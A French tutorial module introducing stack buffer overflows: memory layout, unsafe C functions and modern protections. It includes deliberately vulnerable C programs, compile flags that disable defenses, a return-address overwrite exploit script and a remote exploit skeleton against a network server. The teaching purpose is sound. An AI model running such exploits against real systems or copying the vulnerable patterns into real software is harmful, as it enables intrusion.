# 21 - Buffer Overflow Introduction

## 🎯 Ce que tu vas apprendre
- Comprendre ce qu'est un buffer et comment il fonctionne en mémoire
- Découvrir la vulnérabilité buffer overflow et ses conséquences
- Visualiser comment un overflow écrase la stack
- Identifier les fonctions dangereuses en C
- Reconnaître les protections modernes (stack canary, ASLR, NX/DEP)
- Exploiter ton premier buffer overflow simple

## 📚 Théorie

### C'est quoi un buffer ?

Un **buffer** (tampon) est une **zone de mémoire contigüe** de taille fixe utilisée pour stocker temporairement des données.

Pense à un buffer comme à un **parking avec 10 places numérotées** :
- Tu as exactement 10 places (taille fixe)
- Les places sont côte à côte (contigües)
- Si 15 voitures arrivent, les 5 dernières débordent sur la route (overflow)

En C, les buffers les plus courants sont :
- **char buffer[64]** : tableau de 64 caractères
- **int numbers[10]** : tableau de 10 entiers
- **char name[256]** : buffer pour un nom

### Pourquoi les buffers existent ?

Les buffers résolvent **3 problèmes critiques** :

**1. Performance : éviter les appels système coûteux**
```ascii
SANS BUFFER (lent) :
read() → 1 byte → traiter → read() → 1 byte → traiter...
  ↑                           ↑
Syscall (lent)           Syscall (lent)

AVEC BUFFER (rapide) :
read() → 4096 bytes dans buffer → traiter les 4096 d'un coup
  ↑
1 seul syscall
```

**2. Stockage temporaire de données variables**
```c
// Utilisateur peut taper son nom :
char username[256];  // Buffer de 256 bytes
gets(username);      // Stocke l'input ici
```

**3. Gestion de flux (streaming)**
```ascii
LECTURE FICHIER :
Disque → Buffer 8KB → Programme traite par morceaux
         ────────
         Zone tampon
```

### Comment ça marche : anatomie d'un buffer en mémoire

Quand tu déclares un buffer, voici ce qui se passe en mémoire :

```c
char buffer[64];  // Déclaration
```

**En mémoire stack (architecture x64) :**
```ascii
STACK MEMORY (croît vers le BAS ↓)

Adresse basse
    ↓
0x7ffd1000  ┌─────────────────────────┐
            │  buffer[0]  (1er byte)  │
            ├─────────────────────────┤
            │  buffer[1]              │
            ├─────────────────────────┤
            │  buffer[2]              │
            ├─────────────────────────┤
            │  ...                    │
            ├─────────────────────────┤
            │  buffer[63] (dernier)   │
0x7ffd103F  └─────────────────────────┘  ← Fin du buffer (64 bytes)
0x7ffd1040  ┌─────────────────────────┐
            │  Saved Base Pointer     │  ← RBP sauvegardé (8 bytes)
0x7ffd1047  └─────────────────────────┘
0x7ffd1048  ┌─────────────────────────┐
            │  Return Address         │  ← RIP sauvegardé (8 bytes)
0x7ffd104F  └─────────────────────────┘
    ↑
Adresse haute
```

**Explication ligne par ligne :**
- **buffer[0] à buffer[63]** : 64 bytes contigus réservés
- **Saved Base Pointer (RBP)** : adresse du stack frame précédent
- **Return Address (RIP)** : où retourner après la fonction

### Le buffer overflow : qu'est-ce que c'est ?

Un **buffer overflow** se produit quand tu **écris plus de données que la capacité du buffer**.

**Analogie du verre d'eau :**
```ascii
VERRE (buffer de 100ml) :
┌────────┐  ← Bord (limite)
│        │
│  Eau   │  100ml max
│        │
└────────┘

VERSER 200ml :
    ╔════╗  ← DÉBORDEMENT !
┌───╨────╨──┐
│   ║ Eau ║ │
│   ║  ║  ║ │
└───╨──║──╨─┘
       ║
       ↓
    INONDE LA TABLE
    (écrase la mémoire adjacente)
```

**En code C :**
```c
char buffer[64];           // Buffer de 64 bytes
strcpy(buffer, input);     // Si input > 64 bytes → OVERFLOW
```

### Conséquences d'un buffer overflow

**1. Crash du programme (meilleur cas)**
```ascii
AVANT overflow :
0x1000  [buffer: 64 bytes]
0x1040  [RBP: 0x7ffd2000]  ← Valide
0x1048  [RIP: 0x400500]    ← Adresse de retour valide

APRÈS overflow (100 bytes écrits) :
0x1000  [AAAAAAAAAA...]
0x1040  [AAAAAAAAAA...]    ← RBP écrasé
0x1048  [AAAAAAAAAA...]    ← RIP écrasé (0x4141414141 = "AAAAA")
                              ↑
                        Adresse invalide → SEGFAULT
```

**2. Exploitation (pire cas)**
```ascii
ATTAQUANT écrit :
┌──────────────┬──────────┬──────────────┐
│ 64 'A'       │ 8 'A'    │ Adresse      │
│ (remplir)    │ (RBP)    │ du shellcode │
└──────────────┴──────────┴──────────────┘
                              ↑
                    Programme va sauter ICI
                    et exécuter le shellcode !
```

### Fonctions dangereuses en C

Ces fonctions **ne vérifient PAS la taille du buffer** :

| Fonction | Pourquoi dangereuse | Alternative sûre |
|----------|---------------------|------------------|
| `gets(buffer)` | Pas de limite de taille | `fgets(buffer, size, stdin)` |
| `strcpy(dest, src)` | Copie jusqu'au '\0' sans limite | `strncpy(dest, src, n)` |
| `strcat(dest, src)` | Concatène sans limite | `strncat(dest, src, n)` |
| `sprintf(buf, fmt, ...)` | Pas de limite | `snprintf(buf, size, fmt, ...)` |
| `scanf("%s", buf)` | Pas de limite | `scanf("%63s", buf)` (avec taille) |

### Protections modernes contre les buffer overflows

Les compilateurs et OS modernes implémentent plusieurs protections :

**1. Stack Canary (Canary = canari)**
```ascii
SANS CANARY :
┌──────────┐
│ buffer   │
├──────────┤
│ RBP      │
├──────────┤
│ RIP      │  ← Facile d'écraser
└──────────┘

AVEC CANARY :
┌──────────┐
│ buffer   │
├──────────┤
│ CANARY   │  ← Valeur aléatoire secrète (ex: 0xDEADBEEFCAFEBABE)
├──────────┤
│ RBP      │
├──────────┤
│ RIP      │
└──────────┘

MÉCANISME :
1. Au début de la fonction : placer canary
2. Avant le return : vérifier canary
3. Si canary modifié → __stack_chk_fail() → CRASH
```

**2. ASLR (Address Space Layout Randomization)**
```ascii
SANS ASLR (adresses fixes) :
Exécution 1: Stack à 0x7ffd1000
Exécution 2: Stack à 0x7ffd1000  ← Même adresse !
Exécution 3: Stack à 0x7ffd1000
→ Attaquant connaît les adresses

AVEC ASLR (adresses aléatoires) :
Exécution 1: Stack à 0x7ffd1000
Exécution 2: Stack à 0x7a8e3000  ← Différent !
Exécution 3: Stack à 0x7c1f7000  ← Différent !
→ Attaquant doit deviner (difficile)
```

**3. NX/DEP (Non-Executable Stack)**
```ascii
SANS NX :
┌─────────────┐
│ Stack       │  RWX (Read/Write/Execute)
│  shellcode  │  → Peut exécuter du code sur la stack
└─────────────┘

AVEC NX :
┌─────────────┐
│ Stack       │  RW- (Read/Write seulement)
│  shellcode  │  → Tentative d'exécution → CRASH
└─────────────┘
```

**4. PIE (Position Independent Executable)**
```ascii
Code du programme aussi randomisé :
Fonction main() à 0x5560a000  (exécution 1)
Fonction main() à 0x55f1b000  (exécution 2)
→ Rend ROP chains plus difficiles
```

## 🔍 Visualisation / Schéma

### Scénario complet d'un buffer overflow

```ascii
PROGRAMME VULNÉRABLE :

void vulnerable() {
    char buffer[64];
    gets(buffer);  // ❌ DANGEREUX
}

int main() {
    vulnerable();
    printf("Retour normal\n");
    return 0;
}


STACK AVANT gets() :
                                    ┌─ HAUT DE LA MÉMOIRE
0x7ffd1000  ┌──────────────────────┤
            │                      │
            │  buffer[0..63]       │  64 bytes vides
            │                      │
0x7ffd103F  └──────────────────────┤
0x7ffd1040  ┌──────────────────────┤
            │  Saved RBP           │  0x00007ffd2000
0x7ffd1047  └──────────────────────┤
0x7ffd1048  ┌──────────────────────┤
            │  Return Address      │  0x0000000000400580 (adresse de printf)
0x7ffd104F  └──────────────────────┤
                                    └─ BAS DE LA MÉMOIRE


UTILISATEUR TAPE : "A" × 80 (80 caractères)

STACK APRÈS gets() :

0x7ffd1000  ┌──────────────────────┐
            │ AAAAAAAAAAAAAAAA     │  ← 64 'A' (remplissent le buffer)
            │ AAAAAAAAAAAAAAAA     │
            │ AAAAAAAAAAAAAAAA     │
            │ AAAAAAAAAAAAAAAA     │
0x7ffd103F  └──────────────────────┘
0x7ffd1040  ┌──────────────────────┐
            │ AAAAAAAA             │  ← 8 'A' (écrasent RBP)
0x7ffd1047  └──────────────────────┘     Saved RBP = 0x4141414141414141
0x7ffd1048  ┌──────────────────────┐
            │ AAAAAAAA             │  ← 8 'A' (écrasent Return Address)
0x7ffd104F  └──────────────────────┘     Return = 0x4141414141414141
                                                     ↑
                                             ADRESSE INVALIDE !

LORS DU RETOUR :
1. vulnerable() termine
2. Exécute "ret" (instruction assembleur)
3. "ret" lit l'adresse de retour : 0x4141414141414141
4. Tente de sauter à 0x4141414141414141
5. SEGMENTATION FAULT (adresse non mappée)

Programme CRASH !
```

## 💻 Exemple pratique

### Code vulnérable simple

**vuln.c :**
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[64];

    printf("Entrez votre nom : ");
    gets(buffer);  // ❌ VULNÉRABLE

    printf("Bonjour, %s!\n", buffer);
}

int main() {
    printf("=== Programme vulnérable ===\n");
    vulnerable_function();
    printf("Retour normal\n");  // Cette ligne ne s'exécute jamais si overflow
    return 0;
}
```

**Compilation (SANS protections pour l'apprentissage) :**
```bash
# Linux/macOS
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# Explications des flags :
# -fno-stack-protector : Désactive le stack canary
# -z execstack         : Rend la stack exécutable (désactive NX)
# -no-pie              : Désactive PIE (adresses fixes)
```

**Explication ligne par ligne du code :**

```c
void vulnerable_function() {
    char buffer[64];              // 1. Alloue 64 bytes sur la stack

    printf("Entrez votre nom : ");
    gets(buffer);                 // 2. ❌ Lit input SANS limite de taille
                                  //    Si input > 64, overflow garanti !

    printf("Bonjour, %s!\n", buffer);  // 3. Affiche le contenu
}
```

**gets(buffer)** est LA fonction la plus dangereuse en C :
- Lit jusqu'à rencontrer '\n' (nouvelle ligne)
- NE vérifie PAS la taille du buffer
- Écrit autant de bytes que nécessaire → overflow systématique

### Test 1 : Utilisation normale

```bash
$ ./vuln
=== Programme vulnérable ===
Entrez votre nom : Alice
Bonjour, Alice!
Retour normal
```

**Pas d'overflow** : "Alice" = 5 bytes < 64 bytes → OK

### Test 2 : Overflow simple (crash)

```bash
$ python3 -c "print('A' * 80)" | ./vuln
=== Programme vulnérable ===
Entrez votre nom : Bonjour, AAAAAAAAAA...!
Segmentation fault (core dumped)
```

**Overflow** : 80 'A' écrasent le buffer (64) + RBP (8) + Return Address (8)

**Analyse du crash avec GDB :**
```bash
$ gdb ./vuln
(gdb) run < <(python3 -c "print('A' * 80)")
Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()

(gdb) info registers rip
rip            0x414141414141      0x414141414141
                ^^^^^^^^^^^^^^^^
                   "AAAAA" en hexadécimal !
```

**0x41 = 'A' en ASCII** → Le programme a tenté de sauter à une adresse composée de 'A'

### Test 3 : Overflow contrôlé (exploitation basique)

**Objectif** : Rediriger l'exécution vers une fonction "win()" qu'on ne devrait jamais appeler.

**vuln2.c :**
```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("\n🎉 FONCTION SECRÈTE APPELÉE !\n");
    printf("Tu as exploité le buffer overflow !\n");
}

void vulnerable_function() {
    char buffer[64];

    printf("Entrez votre nom : ");
    gets(buffer);

    printf("Bonjour, %s!\n", buffer);
}

int main() {
    printf("=== Exploitation basique ===\n");
    printf("Adresse de win() : %p\n", (void*)win);
    vulnerable_function();
    printf("Retour normal\n");
    return 0;
}
```

**Compilation :**
```bash
gcc vuln2.c -o vuln2 -fno-stack-protector -no-pie
```

**Étape 1 : Trouver l'adresse de win()**
```bash
$ ./vuln2
=== Exploitation basique ===
Adresse de win() : 0x401136
```

**Étape 2 : Construire le payload**
```python
# exploit.py
import struct

# Adresse de win() (little-endian pour x64)
win_addr = 0x401136
win_bytes = struct.pack("<Q", win_addr)  # <Q = little-endian 64-bit

# Payload : 64 'A' (remplir buffer) + 8 'B' (écraser RBP) + adresse de win()
payload = b'A' * 64 + b'B' * 8 + win_bytes

# Écrire dans un fichier
with open('payload', 'wb') as f:
    f.write(payload)

print(f"Payload créé : {len(payload)} bytes")
print(f"Adresse de win() : {hex(win_addr)}")
```

**Étape 3 : Exploiter**
```bash
$ python3 exploit.py
Payload créé : 80 bytes
Adresse de win() : 0x401136

$ ./vuln2 < payload
=== Exploitation basique ===
Adresse de win() : 0x401136
Entrez votre nom : Bonjour, AAAAAAAAAA...!

🎉 FONCTION SECRÈTE APPELÉE !
Tu as exploité le buffer overflow !
Segmentation fault
```

**SUCCÈS !** On a redirigé l'exécution vers win() alors qu'elle n'était jamais appelée !

**Explication du payload :**
```ascii
PAYLOAD (80 bytes) :

┌──────────────┬──────────┬────────────────┐
│  64 'A'      │  8 'B'   │  0x0000000000401136  │
│              │          │  (little-endian)     │
└──────────────┴──────────┴────────────────┘
      ↓              ↓            ↓
  Remplir      Écraser RBP   Écraser Return Address
  le buffer                  avec adresse de win()

QUAND vulnerable_function() RETOURNE :
1. "ret" lit la Return Address
2. Return Address = 0x401136 (adresse de win)
3. Programme saute à win()
4. win() s'exécute !
```

## 🎯 Application Red Team

### Scénario réel : Exploitation d'un serveur réseau

Imagine un **serveur de chat** vulnérable :

**server.c (simplifié) :**
```c
// Serveur vulnérable qui écoute sur le port 9999
void handle_client(int client_socket) {
    char buffer[256];

    send(client_socket, "Entrez votre pseudo : ", 23, 0);
    recv(client_socket, buffer, 1024, 0);  // ❌ Lit 1024 bytes dans buffer de 256 !

    printf("Client connecté : %s\n", buffer);
}
```

**Exploitation à distance :**
```python
#!/usr/bin/env python3
import socket
import struct

# 1. Se connecter au serveur
target = "192.168.1.100"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

# 2. Recevoir le prompt
data = s.recv(1024)
print(data.decode())

# 3. Construire le payload
# Hypothèse : on a trouvé l'adresse d'une fonction backdoor() sur le serveur
backdoor_addr = 0x00000000004015a0

payload = b'A' * 256          # Remplir le buffer
payload += b'B' * 8           # Écraser RBP
payload += struct.pack("<Q", backdoor_addr)  # Écraser Return Address

# 4. Envoyer le payload
s.send(payload)

# 5. Shell interactif
print("[+] Exploit envoyé ! Tentative de connexion au shell...")
# ... (code pour interagir avec le shell)
```

**Impact :**
- Exécution de code arbitraire à distance (RCE)
- Élévation de privilèges si le serveur tourne en root
- Prise de contrôle totale du serveur

### Techniques avancées de Red Team

**1. Fuzzing pour trouver des buffer overflows**
```bash
# Utiliser AFL++ pour fuzzer automatiquement
afl-fuzz -i input/ -o output/ -- ./programme @@
```

**2. Bypasser le stack canary avec une fuite d'information**
```c
// Si on peut lire la mémoire avant d'écrire :
printf(buffer);  // ❌ Format string (module 25)
                 // Permet de leak le canary
// Puis reconstruire le payload avec le vrai canary
```

**3. Exploitation avec ASLR activé**
```bash
# Technique : Information leak + ROP chain
1. Leak une adresse de la libc (format string, read out-of-bounds)
2. Calculer la base de la libc
3. Construire ROP chain avec les gadgets de la libc
4. Profit !
```

## 📝 Points clés

- Un **buffer** est une zone de mémoire de taille fixe pour stocker temporairement des données
- Un **buffer overflow** se produit quand on écrit plus de données que la capacité du buffer
- Les overflows écrasent la **mémoire adjacente** : variables, RBP, Return Address
- En écrasant la **Return Address**, on peut rediriger l'exécution du programme
- Fonctions dangereuses : `gets()`, `strcpy()`, `strcat()`, `sprintf()`, `scanf("%s")`
- Protections modernes : **Stack Canary**, **ASLR**, **NX/DEP**, **PIE**
- Pour exploiter avec protections : combiner plusieurs techniques (leak + ROP)
- Les buffer overflows sont à la base de **90% des exploits binaires**
- En Red Team, on les utilise pour **RCE** (Remote Code Execution) et **élévation de privilèges**

## ➡️ Prochaine étape

Maintenant que tu comprends le concept de buffer overflow, le prochain module va approfondir :

**Module 22 - Stack Overflow x64** : Exploitation détaillée sur architecture x64
- Anatomie précise de la stack x64
- Calcul d'offsets pour l'exploitation
- Techniques de leak d'adresses
- Construction de payloads précis
- Bypasser les protections basiques

Tu vas passer de la théorie à l'exploitation pratique systématique !
